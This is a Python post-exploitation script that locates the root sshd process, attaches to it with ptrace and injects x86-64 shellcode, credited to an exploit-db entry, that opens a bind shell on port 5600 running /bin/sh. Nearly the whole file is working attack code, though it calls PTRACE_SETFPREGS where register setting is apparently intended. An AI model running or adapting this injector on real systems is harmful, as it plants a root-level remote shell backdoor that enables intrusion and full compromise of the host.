import ctypes
import struct
import subprocess

# URL: https://www.exploit-db.com/exploits/41128
SHELLCODE  = b""
SHELLCODE += b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02"
SHELLCODE += b"\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e"
SHELLCODE += b"\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a"
SHELLCODE += b"\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75"
SHELLCODE += b"\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
SHELLCODE += b"\x8d\x3c\x24\xb0\x3b\x0f\x05\x90"

# File: /usr/include/sys/ptrace.h
PTRACE_PEEKTEXT     = 1
PTRACE_PEEKDATA     = 2
PTRACE_PEEKUSER     = 3
PTRACE_POKETEXT     = 4
PTRACE_POKEDATA     = 5
PTRACE_POKEUSER     = 6
PTRACE_CONT         = 7
PTRACE_KILL         = 8
PTRACE_SINGLESTEP   = 9
PTRACE_GETREGS      = 12
PTRACE_SETREGS      = 13
PTRACE_GETFPREGS    = 14
PTRACE_SETFPREGS    = 15
PTRACE_ATTACH       = 16
PTRACE_DETACH       = 17
PTRACE_GETFPXREGS   = 18
PTRACE_SETFPXREGS   = 19
PTRACE_SYSCALL      = 24
PTRACE_SETOPTIONS   = 0x4200
PTRACE_GETEVENTMSG  = 0x4201
PTRACE_GETSIGINFO   = 0x4202
PTRACE_SETSIGINFO   = 0x4203


# File: /usr/include/sys/user.h
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_uint64),
        ("r14", ctypes.c_uint64),
        ("r13", ctypes.c_uint64),
        ("r12", ctypes.c_uint64),
        ("rbp", ctypes.c_uint64),
        ("rbx", ctypes.c_uint64),
        ("r11", ctypes.c_uint64),
        ("r10", ctypes.c_uint64),
        ("r9", ctypes.c_uint64),
        ("r8", ctypes.c_uint64),
        ("rax", ctypes.c_uint64),
        ("rcx", ctypes.c_uint64),
        ("rdx", ctypes.c_uint64),
        ("rsi", ctypes.c_uint64),
        ("rdi", ctypes.c_uint64),
        ("orig_rax", ctypes.c_uint64),
        ("rip", ctypes.c_uint64),
        ("cs", ctypes.c_uint64),
        ("eflags", ctypes.c_uint64),
        ("rsp", ctypes.c_uint64),
        ("ss", ctypes.c_uint64),
        ("fs_base", ctypes.c_uint64),
        ("gs_base", ctypes.c_uint64),
        ("ds", ctypes.c_uint64),
        ("es", ctypes.c_uint64),
        ("fs", ctypes.c_uint64),
        ("gs", ctypes.c_uint64),
    ]


def find_ssh_pid():
    p = subprocess.Popen(["bash", "-c", "ps auxf|grep sshd|grep root|tail -n 1|awk '{print $2}'"], stdout=subprocess.PIPE)
    out, err = p.communicate()
    pid = int(out.decode().rstrip("\n"))
    if not err:
        return pid
    return -1


def inject_shellcode(pid, src, dst, len):
    print(f"[*] Injecting shellcode of size {len} at {hex(dst)} in process {pid} ...")
    for i in range(0,len,8):
        word = struct.unpack("L", src[i:i+8])[0]
        if libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(dst+i), word) < 0:
            print(f"[x] ptrace() failed to write the word.")
            exit(-1)
    return 0


if __name__ == "__main__":
    ssh_pid = find_ssh_pid()
    if ssh_pid < 0:
        print("[x] find_ssh_pid() failed to find sshd PID")
        exit(-1)
    print(f"[+] sshd pid: {ssh_pid}")

    # File: /usr/include/sys/ptrace.h
    libc = ctypes.cdll.LoadLibrary("libc.so.6")
    libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
    libc.ptrace.restype = ctypes.c_uint64

    if libc.ptrace(PTRACE_ATTACH, ssh_pid, None, None) < 0:
        print(f"[x] ptrace() failed to attached to process: {ssh_pid}")
        exit(-1)
    print(f"[+] ptrace() attached to process: {ssh_pid}")

    backup_registers = user_regs_struct()
    if libc.ptrace(PTRACE_GETREGS, ssh_pid, None, ctypes.byref(backup_registers)) < 0:
        print("[x] ptrace() failed to get registers.")
        exit(-1)
    print(f"[+] RIP: {hex(backup_registers.rip)}")

    if inject_shellcode(ssh_pid, SHELLCODE, backup_registers.rip, len(SHELLCODE)) < 0:
        print("[x] inject_shellcode() failed to inject shellcode.")
        exit(-1)
    print("[+] inject_shellcode() succeed.")

    registers = backup_registers
    registers.rip += 2 
    if libc.ptrace(PTRACE_SETFPREGS, ssh_pid, None, ctypes.byref(registers)) < 0:
        print("[x] ptrace() failed to set registers.")
        exit(-1)
    print(f"[+] New RIP: {hex(registers.rip)}")

    if libc.ptrace(PTRACE_DETACH, ssh_pid, None, None) < 0:
        print(f"[x] ptrace() failed to detached from process: {ssh_pid}")
        exit(-1)
    print(f"[+] ptrace() detached from process: {ssh_pid}")
